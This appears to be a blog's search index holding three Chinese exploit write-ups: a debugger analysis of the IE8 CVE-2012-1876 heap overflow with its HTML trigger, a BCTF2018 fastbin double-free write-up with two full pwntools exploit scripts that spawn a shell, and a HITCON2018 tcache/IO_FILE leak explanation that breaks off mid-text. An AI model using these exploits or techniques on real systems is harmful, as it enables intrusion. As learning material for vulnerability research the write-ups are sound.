<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[IE8漏洞[cve-2012-1876]分析]]></title>
    <url>%2Fpost%2Fb72ee585.html</url>
    <content type="text"><![CDATA[第一次接触ctf外的漏洞，跟着各个师傅的博客和《漏洞战争》折腾了好几天，也终于算是成功了。在这里记录一下自己整个调试过程，做个总结。调试环境windows7 32位(IE版本: 8.0.7600.16385)windbgImmunity DebuggerPOC调试poc代码：123456789101112131415&lt;html&gt;&lt;body&gt; &lt;table style="table-layout:fixed" &gt; &lt;col id="132" width="41" span="1" &gt;&amp;nbsp;&lt;/col&gt; &lt;/table&gt; &lt;script&gt; function over_trigger() &#123; var obj_col = document.getElementById("132"); obj_col.width = "42765"; obj_col.span = 1000; &#125; setTimeout("over_trigger();",1); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;基于HPA的漏洞分析方法首先用gflag.exe对IE进程开启hpa选项(gflag.exe位于windbg文件夹下)：gflag.exe -i iexplore.exe +hpa用IE打开poc.html，然后使用windbg对进程进行attach。此处注意选择位置靠下的一个进程。然后命令g，继续运行。在浏览器中允许阻止的内容。然后就可以发现windbg断下了123456789101112131415161718192021220:005&gt; g(644.3a8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000009 ebx=00001482 ecx=00010689 edx=00000014 esi=08128000 edi=08128018eip=6ad1f167 esp=045edf08 ebp=045edf14 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206mshtml!CTableColCalc::AdjustForCol+0x15:6ad1f167 890f mov dword ptr [edi],ecx ds:0023:08128018=????????0:005&gt; kbChildEBP RetAddr Args to Child 045edf14 6ab95b8e 00001482 045ee258 00000001 mshtml!CTableColCalc::AdjustForCol+0x15045edfc4 6aa00713 00000001 045ee258 000003e8 mshtml!CTableLayout::CalculateMinMax+0x52f045ee1e0 6a9eaf19 045ee258 045ee224 00000001 mshtml!CTableLayout::CalculateLayout+0x276045ee38c 6aadcc48 045efa00 045ee5b8 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720045ee4c4 6aacf5d0 04d00ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8045ee588 6aacf31d 04d00ea8 00016747 00016747 mshtml!CFlowLayout::MeasureSite+0x312045ee5d0 6aacf664 09330f00 00000061 045efa00 mshtml!CFlowLayout::GetSiteWidth+0x156045ee610 6aacfb40 09224fb0 04d00ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce045ee694 6eef665d 09244ff8 045ee6b4 045ee778 mshtml!CEmbeddedILSObj::Fmt+0x150......可以看到，是由于edi中储存了一个非法地址而造成的崩溃通过汇编代码往上回溯，发现edi的值来自于[esi+0x18]，而在当前函数中没有esi的处理代码，所以往上层函数看，定位到mshtml!CTableLayout::CalculateMinMax，在此处下上断点，重新attach调试。因为下断点前要确保所在模块已经被加载，所以通过sxe ld:mshtml让程序在加载mshtml后断下。123456789101112130:013&gt; lmm mshtmlstart end module name6afb0000 6b562000 mshtml (pdb symbols) C:\Users\hgy\Desktop\WinDbg\x86\sym\mshtml.pdb\5B825981E9B445BBB998A27119FF0D6E2\mshtml.pdb0:013&gt; bp mshtml!CTableLayout::CalculateMinMax0:013&gt; bl 0 e 6b0c018a 0001 (0001) 0:**** mshtml!CTableLayout::CalculateMinMax0:013&gt; gBreakpoint 0 hiteax=ffffffff ebx=08251ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=045ee604eip=6b0c018a esp=045ee3a8 ebp=045ee5c0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax:6b0c018a 8bff mov edi,edi继续单步执行：123456789101112131415161718192021222324252627282930313233343536373839404142430:005&gt; peax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018c esp=0462e288 ebp=0462e4a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x2:6878018c 55 push ebp0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018d esp=0462e284 ebp=0462e4a0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x3:6878018d 8bec mov ebp,esp0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878018f esp=0462e284 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x5:6878018f 81ec90000000 sub esp,90h0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780195 esp=0462e1f4 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xb:68780195 53 push ebx0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780196 esp=0462e1f0 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xc:68780196 8b5d08 mov ebx,dword ptr [ebp+8] ss:0023:0462e28c=05f8cea80:005&gt; dd poi(ebp+8)05f8cea8 68679868 0562cf30 05f7efb8 6883491805f8ceb8 00000001 00000000 0108080d ffffffff05f8cec8 00000000 00000000 00000000 ffffffff05f8ced8 00016747 00009d9e 00000000 0000000005f8cee8 00000000 00412802 00000000 0000000005f8cef8 00000000 00000001 ffffffff ffffffff05f8cf08 ffffffff ffffffff 68679fd0 0000000405f8cf18 00000004 08c50ff0 68679fd0 000000040:005&gt; ln 68679868 (68679868) mshtml!CTableLayout::`vftable&apos; | (686799a8) mshtml!CTableLayoutBlock::`vftable&apos;Exact matches: mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;我们知道，ebp+8是函数的第一个参数值，《漏洞战争》中指出该参数是CTableLayout对象指正，也就是&lt;table>标签在内存中的对象。通过配合IDA加载符号信息也可得出该结论:void __thiscall CTableLayout::CalculateMinMax(CTableLayout *this, struct CTableCalcInfo *a2, int a3, int a4)继续单步1234567891011121314151617181920212223242526272829300:005&gt; peax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=68780199 esp=0462e1f0 ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0xf:68780199 56 push esi0:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0462e4e4eip=6878019a esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x10:6878019a 8b750c mov esi,dword ptr [ebp+0Ch] ss:0023:0462e290=0462e5180:005&gt; eax=ffffffff ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=6878019d esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x13:6878019d 8b4628 mov eax,dword ptr [esi+28h] ds:0023:0462e540=000000000:005&gt; eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=687801a0 esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x16:687801a0 898574ffffff mov dword ptr [ebp-8Ch],eax ss:0023:0462e1f8=011710000:005&gt; eax=00000000 ebx=05f8cea8 ecx=00412802 edx=ffffffff esi=0462e518 edi=0462e4e4eip=687801a6 esp=0462e1ec ebp=0462e284 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1c:687801a6 8b4354 mov eax,dword ptr [ebx+54h] ds:0023:05f8cefc=00000001可以看到在ebx+0x54处储存的值为1，《漏洞战争》中指出此处即为POC中col标签的span值，记作spannum。继续往下执行，同时配合IDA查看CalculateMinMax函数有这么一段指令：1234567891011121314151617181920212223242526272829303132687802cc 8b8394000000 mov eax,dword ptr [ebx+94h] ; 取出spancmp687802d2 c1e802 shr eax,2687802d5 3bc2 cmp eax,edx ; 将spannum值与spancmp/2比较687802d7 7d39 jge mshtml!CTableLayout::CalculateMinMax+0x1fa (68780312)687802d9 3bd7 cmp edx,edi687802db 8db390000000 lea esi,[ebx+90h]687802e1 0f8c9bcbefff jl mshtml!CTableLayout::CalculateMinMax+0x1da (6867ce82)687802e7 3b5608 cmp edx,dword ptr [esi+8]687802ea 7613 jbe mshtml!CTableLayout::CalculateMinMax+0x1e7 (687802ff)687802ec 6a1c push 1Ch687802ee 8bc2 mov eax,edx687802f0 8bfe mov edi,esi687802f2 e8c08c0c00 call mshtml!CImplAry::EnsureSizeWorker (68848fb7)0:005&gt; ga 687802cc eax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802cc esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:687802cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:05f8cf3c=000000000:005&gt; peax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802d2 esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:687802d2 c1e802 shr eax,20:005&gt; peax=00000000 ebx=05f8cea8 ecx=00000000 edx=00000001 esi=0462e518 edi=00000000eip=687802d5 esp=0462e1e8 ebp=0462e284 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1ba:687802d5 3bc2 cmp eax,edx可以看到程序获取了一个spancmp值，除以2之后与spannum比较，若spannum &lt;= spancmp/4则跳转。此时spannum == 1、spancmp/4 == 0所以不会发生跳转，程序继续往后执行直到call mshtml!CImplAry::EnsureSizeWorkerIDA反编译的函数参数为CImplAry::EnsureSizeWorker(v43, v157, (int)v37 + 0x90, 0x1Cu, (int)v125);跟进该函数（IDA）:12345678910111213141516171819202122232425262728293031int __userpurge CImplAry::EnsureSizeWorker@&lt;eax&gt;(CImplAry *this@&lt;ecx&gt;, unsigned int a2@&lt;eax&gt;, int a3@&lt;edi&gt;, unsigned int MaxCount, int a5)&#123; //MaxCount == 0x1C //a2 == spannum ... v5 = a2; v14 = 4; if ( a2 &gt;= 4 ) &#123; v14 = a2; if ( a2 &gt; 4 ) &#123; v6 = ULongAdd(*(_DWORD *)(a3 + 8), *(_DWORD *)(a3 + 8) &gt;&gt; 1, &amp;v14); if ( v6 ) return v6; if ( v5 &gt; v14 ) v14 = v5; &#125; &#125; v6 = ULongLongToUInt(&amp;dwBytes, MaxCount * (unsigned __int64)v14, v11); if ( !v6 ) &#123; if ( *(_BYTE *)(a3 + 4) &amp; 2 ) &#123; ...//不会进入此处 &#125; v6 = _HeapRealloc((LPVOID *)(a3 + 12), dwBytes, v12); ... &#125; return v6;&#125;其中ULongLongToInt的功能为:12if MaxCount*v14 &gt; 0xFFFFFFFF，dwBytes = -1;else dwBytes = MaxCount*v14;分析后可以得知，该函数将会通过_HeapRealloc()来申请一个堆空间，dwBytes为该空间的大小。同时dwBytes = (spannum &gt; 4 ? spannum : 4) * 0x1c因为我们的spannum == 1，所以将会分配4*0x1c == 0x70大小的空间观察_HeapRealloc函数，可知分配的空间地址将会被esi引用。1234567891011121314151617181920210:005&gt; peax=00000000 ebx=00000000 ecx=00000070 edx=00000000 esi=088faf44 edi=088faf38eip=68d38ff6 esp=0460e040 ebp=0460e054 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0x9c:68d38ff6 e86edcfdff call mshtml!_HeapRealloc (68d16c69)0:005&gt; peax=00000000 ebx=00000000 ecx=77bc349f edx=00000000 esi=088faf44 edi=088faf38eip=68d38ffb esp=0460e044 ebp=0460e054 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CImplAry::EnsureSizeWorker+0xa1:68d38ffb 8bd8 mov ebx,eax0:005&gt; dd poi(esi)08c76f90 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fa0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fb0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fc0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76fe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c76ff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c008c77000 ???????? ???????? ???????? ????????注意，关闭了hpa选项后，堆内存不会被初始化为0xc0。保持mshtml!CTableLayout::CalculateMinMax处的断点，让程序继续运行，再次在该函数断下。往后运行到spannum与spancmp比较处:123456789101112131415161718192021222324250:005&gt; gBreakpoint 1 hiteax=00000000 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702cc esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b1:68c702cc 8b8394000000 mov eax,dword ptr [ebx+94h] ds:0023:088faf3c=000000040:005&gt; peax=00000004 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d2 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1b7:68c702d2 c1e802 shr eax,20:005&gt; eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d5 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x1ba:68c702d5 3bc2 cmp eax,edx0:005&gt; eax=00000001 ebx=088faea8 ecx=00000000 edx=00000001 esi=0460dba8 edi=00000000eip=68c702d7 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableLayout::CalculateMinMax+0x1bc:68c702d7 7d39 jge mshtml!CTableLayout::CalculateMinMax+0x1fa (68c70312) [br=1]发现spancmp == 4、spannum == 1此时spancmp/4 == spannum，将会发生跳转，意味着不会再执行CImplAry::EnsureSizeWorker函数。在获取span值的函数mshtml!CTableCol::GetAAspan下断12345678910111213140:005&gt; bp mshtml!CTableCol::GetAAspan0:005&gt; gBreakpoint 2 hiteax=08776fd0 ebx=088faea8 ecx=00000031 edx=00000000 esi=08c76fac edi=08776fd0eip=68bfa007 esp=0460d874 ebp=0460d914 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableCol::GetAAspan:68bfa007 8bff mov edi,edi0:005&gt; gueax=000003e8 ebx=088faea8 ecx=00000002 edx=08d2dff0 esi=08c76fac edi=08776fd0eip=68e05a33 esp=0460d878 ebp=0460d914 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CTableLayout::CalculateMinMax+0x383:68e05a33 3de8030000 cmp eax,3E8h发现执行完此函数后，返回值(eax)的值已经变为了0x3e8，即POC中所设置的1000在函数mshtml!CWidthUnitValue::GetPixelWidth处下断12345678910111213140:005&gt; bp mshtml!CWidthUnitValue::GetPixelWidth0:005&gt; gBreakpoint 1 hiteax=0047e278 ebx=00442380 ecx=004ee070 edx=004af208 esi=0249e2d8 edi=00000001eip=66ce63d8 esp=0249df9c ebp=0249e044 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CWidthUnitValue::GetPixelWidth:66ce63d8 8bff mov edi,edi0:005&gt; gueax=00001405 ebx=00442380 ecx=004ee070 edx=00000014 esi=0249e2d8 edi=00000001eip=66f35ab8 esp=0249dfa8 ebp=0249e044 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CTableLayout::CalculateMinMax+0x459:66f35ab8 837da400 cmp dword ptr [ebp-5Ch],0 ss:0023:0249dfe8=00000000可以看到返回值为(eax)为0x1405，该返回值为poc中col标签的width * 125（注：《漏洞战争》和其他师傅的博客中该值都为width * 100，可能是系统配置的原因。。我也很绝望啊）接下来回到让程序崩溃的地方123456789101112131415161718192021222324252627282930v158 = CTableCell::GetAAcolSpan(v29);...v153 = 0;if ( v158 &gt; 0 )&#123; v99 = 28 * v156; v144 += v158; for ( i = 28 * v156; ; v99 = i ) &#123; v149 = (const struct CWidthUnitValue **)(v99 + *((_DWORD *)v37 + 39)); if ( v151 &amp;&amp; v158 &gt; 1 &amp;&amp; v153 == (CTableLayout *)(v158 - 1) ) &#123; v100 = (_DWORD)v155 * (v158 - 1); v99 = v147 - v100; v155 = (struct CWidthUnitValue *)(v147 - v100); &#125; CTableColCalc::AdjustForCol( (CTableColCalc *)v99, (const struct CWidthUnitValue **)v145, v149, v155, a3, v143, (int)v125); v153 = (CTableLayout *)((char *)v153 + 1); i += 28; if ( (signed int)v153 &gt;= v158 ) break; &#125;&#125;程序会循环调用CTableColCalc::AdjustForCol，调用次数由v158控制，即调用spannum次12345678910111213141516171819202122232425262728293031320:005&gt; gBreakpoint 1 hiteax=004793d0 ebx=00421110 ecx=0000001c edx=00000014 esi=00450ffc edi=00000001eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableColCalc::AdjustForCol:670bf152 8bff mov edi,edi0:005&gt; dd 450fe000450fe0 00001405 00001405 00001405 00000000 00450ff0 0045f2d0 00000000 00014058 0000000000451000 004604a0 00000004 00000000 004307f800451010 00000000 00431298 00000000 0000001100451020 00000012 ffffffff 003b74ec 0000000000451030 00000017 00000017 003b74b8 0000000500451040 004432a4 003b74b8 00450c50 0000000d00451050 323f985f 8000f2d0 003a005c 0055005c0:005&gt; gBreakpoint 1 hiteax=004793d0 ebx=00421110 ecx=00000038 edx=00000014 esi=00451018 edi=00000001eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CTableColCalc::AdjustForCol:670bf152 8bff mov edi,edi0:005&gt; dd 450fe000450fe0 00001405 00001405 00001405 0000000000450ff0 0045f2d0 00000000 00014058 00001405 00451000 00001405 00001405 00000000 004307f800451010 00000000 00014058 00000000 0000001100451020 00000012 ffffffff 003b74ec 0000000000451030 00000017 00000017 003b74b8 0000000500451040 004432a4 003b74b8 00450c50 0000000d00451050 323f985f 8000f2d0 003a005c 0055005c可以看到，每次执行都会将GetPixelWidth函数获取的0x1405复制到该片内存中。由于spannum已经被修改为1000，所以会覆盖到1000 * 0x1c大小的空间。而堆块大小只有0x70，所以一定会导致堆溢出，从而crash。poc总结在首次调用CTableLayout::CalculateMinMax时，由于spannum == 1、spancmp == 0，从而调用CImplAry::EnsureSizeWorker函数，分配了4*0x1c == 0x70大小的内存块poc中通过js修改了span值之后，再次调用CTableLayout::CalculateMinMax时，spannum == 1、spancmp == 4，由于满足spannum &lt;= spancmp/4，所以发生跳转，没有重新分配内存块。在CTableColCalc::AdjustForCol函数中，因为spannum被修改为1000，所以将要写入的内存区域远远超过分配好的区域，造成溢出。漏洞利用分析// TODO]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>browser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF2018 easiest writeup]]></title>
    <url>%2Fpost%2Faaf4d161.html</url>
    <content type="text"><![CDATA[并没有参加这次bctf，只有事后看看题目，这道题目不算难，不过还是学到了一些以前不是很清楚的东西，所以记录一下。题目描述题目来源： BCTF 2018知识点：fastbin_attack、IO_FILE题目提供的功能非常简单，只有add和delete123456int menu()&#123; puts("HI!"); puts("1 add "); return puts("2 delete ");&#125;保护情况：123456[*] '/home/hgy/pwn/bctf2018/easiest/easiest' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)漏洞情况12345678910111213int remove()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf("(0-11):"); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 || v1 &gt; 11 ) exit(1); free(ptr[v1]); return puts("delete success !");&#125;在remove时，没有清空ptr指针，存在double free。1234int sub_400946()&#123; return system("/bin/sh");&#125;还有一个后门函数。。利用过程因为没有输出功能，所以泄露libc十分困难，改malloc_hook之类的估计是不行了。所以把目标转移到GOT表，这里有两种方法，一种是通过改GOT表的值，一种是改stdout指针。要点劫持stdout指针0x602082的值可以充当size改写stdout指针，使vtable的地址在我们的预先分配好的chunk处，并预先在chunk中伪造好vtable，将__xsputn对应偏移处写入后门函数的地址。这样，当调用printf时，最终会调用__xsputn，而执行后门函数IO_FILE结构体中_lock的值必须是可写的地址mode的值需要为0劫持GOT表0x60204d的值可以充当size，因为size只检查低4个字节。然后用system的地址往后覆写掉strtol函数的got表就行了EXP1劫持stdout指针123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./easiest')elf = ELF('./easiest')def add(index, size, content): p.recvuntil('2 delete \n') p.sendline('1') p.recvuntil('(0-11):') p.sendline(str(index)) p.recvuntil('Length:') p.sendline(str(size)) p.recvuntil('C:') p.sendline(content)def remove(index): p.recvuntil('2 delete \n') p.sendline('2') p.recvuntil('(0-11):') p.sendline(str(index))shell = 0x400946fake_chunk = 0x60207aptr = 0x6020c0add(8, 0x40, p64(shell)*8)add(1, 0x30, p64(0xdeadbeef))add(2, 0x30, p64(0xdeadbeef))add(3, 0x30, p64(0xdeadbeef))remove(1)remove(2)remove(1)add(4, 0x30, p64(fake_chunk))add(9, 0x30, p64(0))payload += "\x00"*0x16 #paddingpayload += p64(ptr - 0xd8 + 8 * 0x8)add(6, 0x30, p64(fake_chunk))add(10, 0x30, payload)p.sendline("aaa")p.interactive()EXP2劫持GOT表12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./easiest')elf = ELF('./easiest')def add(index, size, content): p.recvuntil('2 delete \n') p.sendline('1') p.recvuntil('(0-11):') p.sendline(str(index)) p.recvuntil('Length:') p.sendline(str(size)) p.recvuntil('C:') p.sendline(content)def remove(index): p.recvuntil('2 delete \n') p.sendline('2') p.recvuntil('(0-11):') p.sendline(str(index))fake_chunk = 0x602045add(1, 0x60, p64(0xdeadbeef))add(2, 0x60, p64(0xdeadbeef))add(3, 0x60, p64(0xdeadbeef))remove(1)remove(2)remove(1)add(4, 0x60, p64(fake_chunk))add(9, 0x60, p64(0))payload = "\x00" * 0xb #paddingpayload += p64(elf.symbols['system'])add(6, 0x60, p64(fake_chunk))add(10, 0x68, payload)p.sendline('/bin/sh')p.interactive()相关链接二进制文件：easiest]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>fastbin_attack</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2018 baby_tcache writeup]]></title>
    <url>%2Fpost%2F8e1cd5dc.html</url>
    <content type="text"><![CDATA[这道题和前一道children_tcache是同一个系列，然而这题难多了_(:зゝ∠)_。在网上搜了一大圈，貌似只有英文的wp，只有硬着头皮肝了。。。这题和children那题唯一的不同就是这题没有现成的输出功能，泄露变得十分困难，还好前段时间也学过了house of orange，不然wp都看不懂。。题目描述题目来源：HITCON CTF 2018知识点：tcache &amp;&amp; overlapping &amp;&amp; off_by_one &amp;&amp; IO_FILE题目界面：12345678$$$$$$$$$$$$$$$$$$$$$$$$$$$🍊 Baby Tcache 🍊$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. New heap $$ 2. Delete heap $ $ 3. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice:保护全开：123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled漏洞情况和children_tcache的漏洞点是完全一样的，都是null byte off_by_one，这里就不再分析了。利用过程overlapping和children_tcache几乎相同的操作，通过last_remainder来绕过检查，然后overlapping。123456789101112131415161718192021222324add_7_times(0x80)del_7_times(0, 7)add_7_times(0x120)del_7_times(0, 7)add_7_times(0x200)add(0x208, 'A') #7add(0x200, 'B') #8add(0x200, 'C') #9del_7_times(0, 7)dele(8) dele(7) #remain 9add(0x108, 'A'*0x108) #remain 0 9 || 创建了一个last_remainderadd_7_times(0x80)add(0x80, 'b1') #remain 0 (1-7) 8 9del_7_times(1, 8)add(0x210, 'b2') #add 1 || remain 0 1 8 9 || 将被overlap的chunkdele(8)dele(9) #overlap泄露libc这里使用IO_FILE来进行泄露，先来看看前提知识。在puts函数内部实现中，先调用_IO_new_file_overflow123456789101112131415161718int_IO_new_file_overflow (_IO_FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; : : &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, // our target f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);在这个函数中，正常的输出流程需要调用_IO_do_write，所以f-&gt;_flags &amp; _IO_NO_WRITES应该为0，f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING不能为0。然后_IO_do_write会以相同的参数调用new_do_write1234567891011121314151617181920212223static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); // 我们的目标 : :我们的目标就是最后的_IO_SYSWRITE(fp, data, to_do)。从_IO_do_write的实参可知，fp就是FILE指针，data就是f-&gt;_IO_write_base，to_do则是f-&gt;_IO_write_ptr - f-&gt;_IO_write_base(数据长度)。因为else if中的条件构造起来十分困难，所以这里让程序流程通过if中的条件，即fp-&gt;_flags &amp; _IO_IS_APPENDING综上，需要满足的条件有12345678#define _IO_NO_WRITES 0x0008#define _IO_CURRENTLY_PUTTING 0x0800#define _IO_IS_APPENDING 0x1000_flags = 0xfbad0000 // Magic number，我也很绝望啊，没找到这个数据的解释_flags &amp; = ~_IO_NO_WRITES // _flags = 0xfbad0000_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800即flags应该为0xfbad1800所以，如果可以控制stdout的FILE结构体，将stdout-&gt;_flags设置为我们计算出的值并将stdout-&gt;_IO_write_base的最低位字节改小一点，这样就能输出内存中的一段数据，而这段数据中通常就会存在libc中的某个地址。因为只要能够修改tcache中chunk的fd指针，就能在任意地址分配chunk。在前面的overlapping中，我们已经满足了这个条件，只需要改写chunk_b2的fd指针到_IO_2_1_stdout_(stdout的FILE结构体)，然后就可以在此处分配一个chunk并改写其中的值了。因为_IO_2_1_stdout_的地址和在unsortedbin中chunk的fd指针的值只有最后3个16进制位不同，所以我们需要先在chunk_b2处通过overlapping申请并释放一个smallchunk来获取fd指针然后再重新在这分配一个chunk，通过partial 